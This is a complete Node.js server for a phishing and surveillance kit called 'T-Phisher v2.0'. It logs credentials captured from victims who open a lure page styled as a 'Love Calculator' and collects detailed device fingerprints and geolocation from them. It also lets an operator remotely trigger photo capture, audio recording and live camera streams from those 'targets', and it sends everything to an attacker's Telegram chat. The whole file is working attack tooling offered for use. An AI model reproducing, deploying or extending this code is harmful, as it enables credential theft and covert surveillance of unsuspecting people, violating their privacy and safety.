// ============================================================
//   T-Phisher v2.0
//   Enhanced Server with Telegram Integration & WebSocket Routing
//
//   SECURITY NOTICE:
//   - Never hardcode your BOT_TOKEN or CHAT_ID in this file.
//   - For local development: create a .env file in this directory
//     (see .env.example for the required format).
//   - For production (e.g. Render): set BOT_TOKEN and CHAT_ID
//     as environment variables in your hosting dashboard.
//   - The .env file is listed in .gitignore and will never be
//     committed to the repository.
// ============================================================

const fs        = require('fs');
const { exec }  = require('child_process');
const express   = require('express');
const path      = require('path');
const http      = require('http');
const WebSocket = require('ws');
const TelegramBotModule = require('node-telegram-bot-api');
const TelegramBot = TelegramBotModule.default || TelegramBotModule;

// ─── Load .env file (local development only) ──────────────────────────────────
// In production, environment variables are injected by the hosting platform.
const envPath = path.join(__dirname, '.env');
if (fs.existsSync(envPath)) {
  const envContent = fs.readFileSync(envPath, 'utf8');
  envContent.split(/\r?\n/).forEach(line => {
    const trimmedLine = line.trim();
    if (trimmedLine && !trimmedLine.startsWith('#')) {
      const equalsIdx = trimmedLine.indexOf('=');
      if (equalsIdx > 0) {
        const key = trimmedLine.substring(0, equalsIdx).trim();
        const val = trimmedLine.substring(equalsIdx + 1).trim().replace(/^["']|["']$/g, '');
        // Only set if not already defined (platform env vars take priority)
        if (key && process.env[key] === undefined) {
          process.env[key] = val;
        }
      }
    }
  });
}

// ─── Configuration ────────────────────────────────────────────────────────────
// Values are read from environment variables — never hardcoded.
const PORT      = process.env.PORT      || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const CHAT_ID   = process.env.CHAT_ID   || 'YOUR_TELEGRAM_CHAT_ID';

// ─── Initialize Core Services ─────────────────────────────────────────────────
const app    = express();
const server = http.createServer(app);
const wss    = new WebSocket.Server({ server });
const bot    = new TelegramBot(BOT_TOKEN, { polling: false });

// ─── In-Memory State ──────────────────────────────────────────────────────────
const logs           = [];      // credential logs
const connectedTargets = new Map(); // clientId -> userInfo object
const activityFeed   = [];      // recent activity events
const mediaStore     = [];      // captured photos and audio
let   clientIdCounter = 0;
let   alertsSent     = 0;

// ─── Middleware ───────────────────────────────────────────────────────────────
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ─── HTTP Routes ──────────────────────────────────────────────────────────────

// Serve admin panel
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Log captured credentials
app.post('/api/log', (req, res) => {
  const { username } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const timestamp = new Date();

  const logEntry = {
    id: logs.length + 1,
    ip: ip === '::1' ? '127.0.0.1' : ip,
    username: username || 'N/A',
    date: timestamp.toLocaleDateString(),
    time: timestamp.toLocaleTimeString(),
    timestamp: timestamp.toISOString()
  };

  logs.push(logEntry);

  // Broadcast to all admin WebSocket clients
  broadcastToAdmins({ type: 'NEW_LOG', log: logEntry, totalAttempts: logs.length });

  // Push activity event
  pushActivity('credential', `🔑 Credential captured — User: ${logEntry.username} | IP: ${logEntry.ip}`);

  // Forward to Telegram
  const tgMsg = `🔑 <b>Credential Captured!</b>\n👤 Username: <code>${logEntry.username}</code>\n🌐 IP: <code>${logEntry.ip}</code>\n📅 ${logEntry.date} ${logEntry.time}`;
  bot.sendMessage(CHAT_ID, tgMsg, { parse_mode: 'HTML' }).catch(err =>
    console.error('\x1b[31m[Telegram] Credential send error:', err.message, '\x1b[0m')
  );

  console.log(`\n\x1b[31m [+] \x1b[32m Logged!\x1b[34m #${logEntry.id}\x1b[0m`);
  console.log(`\x1b[31m [-] \x1b[32m IP    :\x1b[34m ${logEntry.ip}\x1b[0m`);
  console.log(`\x1b[31m [-] \x1b[32m User  :\x1b[34m ${logEntry.username}\x1b[0m`);

  res.status(200).json({ success: true, attemptNumber: logs.length });
});

// Fetch all credential logs
app.get('/api/logs', (req, res) => {
  res.json({ logs, totalAttempts: logs.length });
});

// Fetch media store
app.get('/api/media', (req, res) => {
  res.json({ media: mediaStore });
});

// ─── WebSocket Helpers ────────────────────────────────────────────────────────

function broadcastToAdmins(data) {
  const msg = JSON.stringify(data);
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN && client.isAdmin) {
      client.send(msg);
    }
  });
}

function broadcastToTarget(clientId, data) {
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN && client.clientId === clientId) {
      client.send(JSON.stringify(data));
    }
  });
}

function broadcastAllTargets(data) {
  const msg = JSON.stringify(data);
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN && !client.isAdmin) {
      client.send(msg);
    }
  });
}

function pushActivity(type, message) {
  const entry = { type, message, timestamp: new Date().toISOString() };
  activityFeed.unshift(entry);
  if (activityFeed.length > 200) activityFeed.pop(); // cap at 200 entries
  broadcastToAdmins({ type: 'ACTIVITY', entry });
}

// ─── User-Agent Parser ───────────────────────────────────────────────────────
function parseUserAgent(ua) {
  if (!ua) return { browser: 'Unknown', os: 'Unknown', device: 'Unknown' };
  const browser =
    ua.includes('Edg/')    ? 'Edge'    :
    ua.includes('OPR/')    ? 'Opera'   :
    ua.includes('Firefox') ? 'Firefox' :
    ua.includes('Chrome')  ? 'Chrome'  :
    ua.includes('Safari')  ? 'Safari'  : 'Unknown';

  const os =
    ua.includes('Windows NT 10') ? 'Windows 10' :
    ua.includes('Windows NT 11') ? 'Windows 11' :
    ua.includes('Windows')       ? 'Windows'    :
    ua.includes('iPhone')        ? 'iOS'        :
    ua.includes('iPad')          ? 'iPadOS'     :
    ua.includes('Android')       ? 'Android'    :
    ua.includes('Mac OS')        ? 'macOS'      :
    ua.includes('Linux')         ? 'Linux'      : 'Unknown';

  const device =
    (ua.includes('Mobile') || ua.includes('iPhone') || ua.includes('Android'))
      ? 'Mobile' : 'Desktop';

  return { browser, os, device };
}

// ─── Telegram Helpers ─────────────────────────────────────────────────────────
async function sendPhotoToTelegram(imageBase64, clientInfo) {
  try {
    const b64 = imageBase64.replace(/^data:image\/[a-z]+;base64,/, '');
    const buffer = Buffer.from(b64, 'base64');
    await bot.sendPhoto(CHAT_ID, buffer, {
      caption: `📸 <b>Photo Captured</b>\n🌐 IP: <code>${clientInfo?.ip || 'Unknown'}</code>\n🖥️ ${clientInfo?.browser || '?'} on ${clientInfo?.os || '?'} (${clientInfo?.device || '?'})`,
      parse_mode: 'HTML'
    }, { filename: `capture_${Date.now()}.jpg`, contentType: 'image/jpeg' });
    console.log('\x1b[32m[Telegram] 📸 Photo sent successfully\x1b[0m');
    return true;
  } catch (err) {
    console.error('\x1b[31m[Telegram] Photo error:', err.message, '\x1b[0m');
    return false;
  }
}

async function sendAudioToTelegram(audioBase64, clientInfo) {
  try {
    const b64 = audioBase64.replace(/^data:[^;]+;base64,/, '');
    const buffer = Buffer.from(b64, 'base64');
    // Try sendDocument as a fallback (more reliable than sendAudio for webm)
    await bot.sendDocument(CHAT_ID, buffer, {
      caption: `🎙️ <b>Audio Recorded</b>\n🌐 IP: <code>${clientInfo?.ip || 'Unknown'}</code>\n🕒 ${new Date().toLocaleTimeString()}`,
      parse_mode: 'HTML'
    }, { filename: `audio_${Date.now()}.webm`, contentType: 'audio/webm' });
    console.log('\x1b[32m[Telegram] 🎙️ Audio sent successfully\x1b[0m');
    return true;
  } catch (err) {
    console.error('\x1b[31m[Telegram] Audio error:', err.message, '\x1b[0m');
    return false;
  }
}

async function sendTextToTelegram(message) {
  try {
    await bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
    alertsSent++;
    console.log('\x1b[32m[Telegram] 🚨 Alert sent\x1b[0m');
    return true;
  } catch (err) {
    console.error('\x1b[31m[Telegram] Alert error:', err.message, '\x1b[0m');
    return false;
  }
}

// ─── WebSocket Server ─────────────────────────────────────────────────────────
wss.on('connection', (ws, req) => {
  const clientId = ++clientIdCounter;
  ws.clientId   = clientId;
  ws.isAdmin    = false;

  const rawIp  = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const cleanIp = rawIp === '::1' ? '127.0.0.1' : rawIp;

  ws.on('message', async (raw) => {
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch { return; }

    switch (msg.type) {

      // ── Admin joins ─────────────────────────────────────────────────────────
      case 'join_admin': {
        ws.isAdmin = true;
        const targets = Array.from(connectedTargets.values()).map(t => ({
          clientId:    t.clientId,
          ip:          t.ip,
          browser:     t.browser,
          os:          t.os,
          device:      t.device,
          screen:      t.screen,
          timezone:    t.timezone,
          location:    t.location,
          connectedAt: t.connectedAt
        }));
        ws.send(JSON.stringify({
          type:          'INIT',
          logs,
          totalAttempts: logs.length,
          targets,
          media:         mediaStore,
          activity:      activityFeed,
          alertsSent
        }));
        console.log('\x1b[33m[Admin] Dashboard connected\x1b[0m');
        
        // Notify admin login to Telegram
        const loginTime = new Date();
        const formattedDate = loginTime.toLocaleDateString();
        const formattedTime = loginTime.toLocaleTimeString();
        const tgMsg = `🚨 <b>Admin Login Alert</b>\n🖥️ Admin panel access authorized!\n🌐 IP: <code>${cleanIp}</code>\n📅 ${formattedDate} ${formattedTime}`;
        sendTextToTelegram(tgMsg);
        break;
      }

      // ── Target sends device fingerprint ─────────────────────────────────────
      case 'user_info': {
        const parsed = parseUserAgent(msg.userAgent || '');
        const userInfo = {
          clientId,
          ip:          cleanIp,
          browser:     parsed.browser,
          os:          parsed.os,
          device:      parsed.device,
          screen:      msg.screen      || 'Unknown',
          timezone:    msg.timezone    || 'Unknown',
          language:    msg.language    || 'Unknown',
          location:    null,
          connectedAt: new Date().toISOString()
        };
        connectedTargets.set(clientId, { ...userInfo, ws });
        broadcastToAdmins({ type: 'TARGET_CONNECTED', user: userInfo });
        pushActivity('connect', `🟢 Target connected — IP: ${cleanIp} | ${parsed.browser} on ${parsed.os} (${parsed.device})`);
        break;
      }

      // ── Target sends full device fingerprint ──────────────────────────────
      case 'visitor_fingerprint': {
        const fp = msg.fingerprint || {};
        const b  = fp.battery   || {};
        const n  = fp.network   || {};
        const d  = fp.device    || {};
        const h  = fp.hardware  || {};
        const g  = fp.gpu       || {};
        const c  = fp.capabilities || {};
        const s  = fp.storage   || {};

        const tgMsg = [
          `🚨 <b>New Visitor Alert</b> 🚨`,
          ``,
          `Someone just opened the Love Calculator website!`,
          ``,
          `📱 <b>DEVICE & BATTERY INFORMATION</b> 📱`,
          ``,
          `🔋 <b>Battery Status:</b>`,
          `• Level: ${b.level != null ? b.level + '%' : 'N/A'}`,
          `• Charging: ${b.charging != null ? (b.charging ? 'Yes' : 'No') : 'N/A'}`,
          `• Charging Time: ${b.chargingTime || 'N/A'}`,
          `• Discharging Time: ${b.dischargingTime || 'N/A'}`,
          ``,
          `🌐 <b>Network Information:</b>`,
          `• Public IP: <code>${n.publicIP || cleanIp}</code>`,
          `• Local IP: ${n.localIP || 'Not found'}`,
          `• Connection Type: ${n.connectionType || 'Unknown'}`,
          `• Effective Type: ${n.effectiveType || 'Unknown'}`,
          `• Downlink Speed: ${n.downlink || 'Unknown'}`,
          `• Latency (RTT): ${n.rtt || 'Unknown'}`,
          `• Max Downlink: ${n.maxDownlink || 'Unknown'}`,
          `• Data Saver: ${n.saveData != null ? n.saveData : 'Unknown'}`,
          `• City: ${n.city || 'Unknown'}`,
          `• Region: ${n.region || 'Unknown'}`,
          `• Country: ${n.country || 'Unknown'}`,
          `• ISP/Org: ${n.org || 'Unknown'}`,
          `• Timezone: ${n.timezone || 'Unknown'}`,
          ``,
          `🤖 <b>OS & Device Information:</b>`,
          `• Device Model: ${d.model || 'Unknown'}`,
          `• OS Version: ${d.osVersion || 'Unknown'}`,
          `• Manufacturer: ${d.manufacturer || 'Unknown'}`,
          `• Browser: ${d.browser || 'Unknown'}`,
          `• Standalone Mode: ${d.standalone || 'No'}`,
          ``,
          `📊 <b>Hardware & System:</b>`,
          `• Language: ${h.language || 'Unknown'}`,
          `• Languages: ${h.languages || 'Unknown'}`,
          `• Screen: ${h.screen || 'Unknown'}`,
          `• Available Screen: ${h.availScreen || 'Unknown'}`,
          `• Color Depth: ${h.colorDepth || 'Unknown'}`,
          `• Pixel Depth: ${h.pixelDepth || 'Unknown'}`,
          `• RAM: ${h.ram || 'Unknown'}`,
          `• CPU Cores: ${h.cpuCores || 'Unknown'}`,
          `• Touch Support: ${h.touchSupport || 'Unknown'}`,
          `• Max Touch Points: ${h.maxTouchPoints || 0}`,
          `• Status: ${h.online || 'Unknown'}`,
          `• Timezone: ${h.timezone || 'Unknown'}`,
          `• Timezone Offset: ${h.timezoneOffset || 'Unknown'}`,
          `• Do Not Track: ${h.doNotTrack || 'Not set'}`,
          ``,
          `🎮 <b>GPU Information:</b>`,
          `• Vendor: ${g.vendor || 'N/A'}`,
          `• Renderer: ${g.renderer || 'N/A'}`,
          ``,
          `🔧 <b>Browser Capabilities:</b>`,
          `• Supported: ${c.supported || 'Unknown'}`,
          `• Cookies: ${c.cookies || 'Unknown'}`,
          `• PDF Viewer: ${c.pdfViewer || 'Unknown'}`,
          `• Notifications: ${c.notifications || 'N/A'}`,
          `• Geolocation: ${c.geolocation || 'Unknown'}`,
          ``,
          `💾 <b>Storage:</b>`,
          `• Quota: ${s.quota || 'Unknown'}`,
          `• Usage: ${s.usage || 'Unknown'}`,
          ``,
          `🌐 <b>Browser:</b>`,
          `${d.userAgent || 'Unknown'}`,
          ``,
          `🕐 <b>Collected:</b> ${fp.collectedAt || new Date().toLocaleString()}`
        ].join('\n');

        sendTextToTelegram(tgMsg);
        pushActivity('fingerprint', `📱 Full device fingerprint captured — IP: ${n.publicIP || cleanIp}`);
        console.log(`\x1b[35m[Fingerprint] 📱 Full device info captured from IP: ${n.publicIP || cleanIp}\x1b[0m`);
        break;
      }

      // ── Target sends location update ─────────────────────────────────────────
      case 'location_update': {
        const { lat, lng, accuracy } = msg;
        const target = connectedTargets.get(clientId);
        if (target) {
          target.location = { lat, lng, accuracy };
          connectedTargets.set(clientId, target);
          broadcastToAdmins({ type: 'LOCATION_UPDATE', clientId, lat, lng, accuracy });
          pushActivity('location', `📍 Location update — IP: ${cleanIp} | ${lat.toFixed(4)}, ${lng.toFixed(4)}`);
          
          if (!target.tgLocationSent) {
            target.tgLocationSent = true;
            connectedTargets.set(clientId, target);
            const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
            const tgMsg = `📍 <b>Location Captured!</b>\n🌐 IP: <code>${target.ip || cleanIp}</code>\n🗺️ <a href="${mapUrl}">Google Maps Link</a>\n🎯 Accuracy: <code>${accuracy ? accuracy.toFixed(1) + 'm' : 'Unknown'}</code>\n📱 ${target.browser || '?'} on ${target.os || '?'}`;
            sendTextToTelegram(tgMsg);
          }
        }
        break;
      }

      // ── Target sends captured photo ───────────────────────────────────────────
      case 'capture_photo': {
        const { data } = msg;
        const target = connectedTargets.get(clientId);
        const mediaEntry = {
          id:        mediaStore.length + 1,
          type:      'photo',
          data,
          clientId,
          ip:        target?.ip || cleanIp,
          browser:   target?.browser,
          os:        target?.os,
          timestamp: new Date().toISOString()
        };
        mediaStore.push(mediaEntry);
        broadcastToAdmins({ type: 'NEW_MEDIA', media: mediaEntry });
        pushActivity('photo', `📸 Photo captured from IP: ${target?.ip || cleanIp}`);
        await sendPhotoToTelegram(data, target);
        break;
      }

      // ── Target sends recorded audio ───────────────────────────────────────────
      case 'capture_audio': {
        const { data } = msg;
        const target = connectedTargets.get(clientId);
        const mediaEntry = {
          id:        mediaStore.length + 1,
          type:      'audio',
          data,
          clientId,
          ip:        target?.ip || cleanIp,
          timestamp: new Date().toISOString()
        };
        mediaStore.push(mediaEntry);
        broadcastToAdmins({ type: 'NEW_MEDIA', media: mediaEntry });
        pushActivity('audio', `🎙️ Audio recorded from IP: ${target?.ip || cleanIp}`);
        await sendAudioToTelegram(data, target);
        break;
      }

      // ── Target denied a permission ────────────────────────────────────────────
      case 'permission_denied': {
        const { permission } = msg;
        pushActivity('denied', `❌ Permission denied: ${permission} — IP: ${cleanIp}`);
        break;
      }

      // ── Admin: request photo from specific or all targets ─────────────────────
      case 'request_photo': {
        if (!ws.isAdmin) break;
        if (msg.targetId) {
          broadcastToTarget(msg.targetId, { type: 'CAPTURE_PHOTO' });
        } else {
          broadcastAllTargets({ type: 'CAPTURE_PHOTO' });
        }
        pushActivity('command', `📸 Photo request sent to ${msg.targetId ? 'target #' + msg.targetId : 'ALL targets'}`);
        break;
      }

      // ── Admin: request audio from specific or all targets ─────────────────────
      case 'request_audio': {
        if (!ws.isAdmin) break;
        if (msg.targetId) {
          broadcastToTarget(msg.targetId, { type: 'CAPTURE_AUDIO' });
        } else {
          broadcastAllTargets({ type: 'CAPTURE_AUDIO' });
        }
        pushActivity('command', `🎙️ Audio request sent to ${msg.targetId ? 'target #' + msg.targetId : 'ALL targets'}`);
        break;
      }

      // ── Admin: request location from all targets ──────────────────────────────
      case 'get_location': {
        if (!ws.isAdmin) break;
        broadcastAllTargets({ type: 'SEND_LOCATION' });
        pushActivity('command', '📍 Location refresh requested for all targets');
        break;
      }

      // ── Admin: send alert text to Telegram ────────────────────────────────────
      case 'send_alert': {
        if (!ws.isAdmin) break;
        const success = await sendTextToTelegram(`🚨 <b>Admin Alert</b>\n${msg.message}`);
        if (success) {
          pushActivity('alert', `🚨 Telegram alert sent: "${msg.message}"`);
          broadcastToAdmins({ type: 'ALERT_SENT', alertsSent });
        }
        break;
      }

      // ── Admin: start live camera stream from a target ─────────────────────────
      case 'start_live_camera': {
        if (!ws.isAdmin) break;
        if (msg.targetId) {
          broadcastToTarget(msg.targetId, { type: 'START_LIVE_CAMERA' });
          pushActivity('command', `📹 Live camera stream started for target #${msg.targetId}`);
        }
        break;
      }

      // ── Admin: stop live camera stream from a target ──────────────────────────
      case 'stop_live_camera': {
        if (!ws.isAdmin) break;
        if (msg.targetId) {
          broadcastToTarget(msg.targetId, { type: 'STOP_LIVE_CAMERA' });
          pushActivity('command', `📹 Live camera stream stopped for target #${msg.targetId}`);
        }
        break;
      }

      // ── Target sends a live camera frame — relay to all admins ────────────────
      case 'camera_frame': {
        // Relay raw frame data directly to admins (no storage)
        broadcastToAdmins({
          type:     'CAMERA_FRAME',
          clientId,
          frame:    msg.frame   // base64 JPEG data-URL
        });
        break;
      }

      // ── Target sends a live audio chunk — relay to all admins ─────────────────
      case 'audio_chunk': {
        broadcastToAdmins({
          type:     'AUDIO_CHUNK',
          clientId,
          audio:    msg.audio   // base64 audio data-URL
        });
        break;
      }
    }
  });

  ws.on('close', () => {
    if (connectedTargets.has(clientId)) {
      const target = connectedTargets.get(clientId);
      connectedTargets.delete(clientId);
      broadcastToAdmins({ type: 'TARGET_DISCONNECTED', clientId });
      pushActivity('disconnect', `🔴 Target disconnected — IP: ${target?.ip || cleanIp}`);
    }
  });

  ws.on('error', (err) => {
    console.error(`[WS Error] Client ${clientId}:`, err.message);
  });
});

// ─── Startup Utilities ────────────────────────────────────────────────────────
function killPort(port) {
  return new Promise(resolve => {
    const isWin = process.platform === 'win32';
    const command = isWin
      ? `for /f "tokens=5" %a in ('netstat -aon ^| findstr :${port}') do taskkill /f /pid %a`
      : `kill -9 $(lsof -t -i:${port}) 2>/dev/null || true`;
    exec(command, () => resolve());
  });
}

function typeText(text, delay = 30) {
  return new Promise(resolve => {
    let i = 0;
    const interval = setInterval(() => {
      if (i < text.length) { process.stdout.write(text[i]); i++; }
      else { clearInterval(interval); process.stdout.write('\n'); resolve(); }
    }, delay);
  });
}

function runStartupCountdown(seconds) {
  return new Promise(resolve => {
    let current = seconds;
    const timer = setInterval(() => {
      if (current > 0) {
        process.stdout.write(`\r\x1b[33m[*] Initialising system environments in ${current}s...\x1b[0m`);
        current--;
      } else {
        clearInterval(timer);
        process.stdout.write('\r\x1b[K');
        resolve();
      }
    }, 1000);
  });
}

// ─── Application Entry Point ──────────────────────────────────────────────────
async function startApplication() {
  await killPort(PORT);

  server.listen(PORT, async () => {
    await runStartupCountdown(3);

    console.log(`\x1b[34m         ┌──────────────────────────────────────┐
         │  \x1b[31mT-PHISHER v2.0 — ONLINE \x1b[34m │
         └──────────────────────────────────────┘\x1b[0m
    `);

    await typeText(`\x1b[32m[Server]   Running on \x1b[34mhttp://localhost:${PORT}\x1b[0m`, 25);
    await typeText(`\x1b[32m[Admin]    Dashboard  \x1b[34mhttp://localhost:${PORT}/admin\x1b[0m`, 25);
    await typeText(`\x1b[32m[Telegram] Bot initialized — Chat ID: \x1b[34m${CHAT_ID}\x1b[0m`, 25);
    await typeText(`\x1b[32m[Ready]    Awaiting targets...\x1b[0m`, 25);

    const url = `http://localhost:${PORT}`;
    switch (process.platform) {
      case 'win32':  exec(`start ${url}`);     break;
      case 'darwin': exec(`open ${url}`);      break;
      default:       exec(`xdg-open ${url}`);  break;
    }
  });
}

startApplication();
